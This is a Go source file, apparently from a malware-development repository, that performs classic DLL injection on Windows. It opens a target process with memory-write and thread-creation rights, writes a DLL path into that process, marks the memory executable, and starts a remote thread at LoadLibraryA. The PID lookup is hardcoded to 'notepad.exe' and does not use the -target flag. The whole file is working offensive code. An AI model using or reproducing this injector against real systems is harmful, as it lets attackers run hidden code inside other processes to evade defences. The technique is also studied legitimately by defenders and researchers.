package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"syscall"
	"unsafe"

	"github.com/himazawa/maldev/internal/utils"
	"golang.org/x/sys/windows"
)

func main() {

	targetPtr := flag.String("target", "", "name of the target process (e.g notepad.exe)")
	dllPath := flag.String("dll", "", "full path to the dll to inject")
	flag.Parse()
	if *targetPtr == "" || *dllPath == "" {
		fmt.Println("You need to specify the target using -target flag and the dll to inject with -dll falg")
		os.Exit(1)
	}

	//dllPath := filepath.Join(workingDirectory, "data/implantDLL.dll")
	dllPathPtr := utils.ConvertToPtr([]byte(*dllPath))
	log.Println("dll path:", dllPath)

	// Extracting target process PID
	pid, err := utils.FindPIDFromProcessName("notepad.exe")
	if err != nil {
		log.Panicln(err)
	}
	log.Println("target process pid:", pid)

	// Extracting LoadLibrary address from the one currently used
	kernel32, err := syscall.LoadLibrary("kernel32.dll")
	if err != nil {
		log.Fatalln(err)
	}
	defer syscall.FreeLibrary(kernel32)

	loadLibraryAddr, err := syscall.GetProcAddress(kernel32, "LoadLibraryA")
	if err != nil {
		log.Fatalln(err)
	}
	log.Println("LoadLibrary address:", loadLibraryAddr)

	// getting a handle to the target process
	processHandle, err := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_QUERY_INFORMATION|
		windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_READ|
		windows.PROCESS_VM_WRITE, false, pid)
	if err != nil {
		log.Fatalln(err)
	}

	pRemoteCode, memPerm, err := utils.GetProcPointer(uintptr(processHandle), uintptr(len(*dllPath)))
	if err != nil {
		log.Println("VirtualAlloc failed")
		log.Println(err)
	}
	// writing the path to the dll
	utils.WriteProcessMemory.Call(uintptr(processHandle), pRemoteCode, dllPathPtr, uintptr(len(*dllPath)))

	// validating injection
	data := make([]byte, len(*dllPath))
	var dataLength uintptr
	utils.ReadProcessMemory.Call(uintptr(processHandle),
		pRemoteCode, uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(*dllPath)),
		uintptr(unsafe.Pointer(&dataLength)),
	)
	fmt.Println("payload:", string(data))

	utils.SetPermissionToExec(uintptr(processHandle), pRemoteCode, uintptr(len(*dllPath)), memPerm)

	// this time we call CreateRemoteThread with LoadLibrary address and our path as argument
	utils.CreateRemoteThread.Call(uintptr(processHandle), 0, 0, loadLibraryAddr, pRemoteCode, 0, 0)
	log.Println("Injection Completed")
	windows.CloseHandle(processHandle)

}
